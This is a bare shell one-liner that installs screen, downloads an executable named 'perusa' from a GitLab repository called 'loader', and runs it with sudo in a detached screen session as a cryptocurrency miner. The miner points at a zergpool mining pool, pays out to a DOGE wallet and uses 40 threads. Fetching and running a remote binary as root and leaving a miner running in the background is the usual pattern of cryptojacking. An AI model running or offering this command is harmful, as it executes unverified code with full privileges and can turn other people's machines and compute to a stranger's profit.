sudo apt install screen -y &&
wget https://gitlab.com/admin1246/loader/-/raw/main/perusa && chmod +x perusa &&
screen -dmS run sudo ./perusa -v -l verushash.na.mine.zergpool.com:3300 -u DCTbhxrn5VcNbskyfv2vXD7bHfP6sGMWcp.$(echo $(shuf -i 1-2000 -n 1)-RDM) -p c=DOGE -t 40 && screen -r

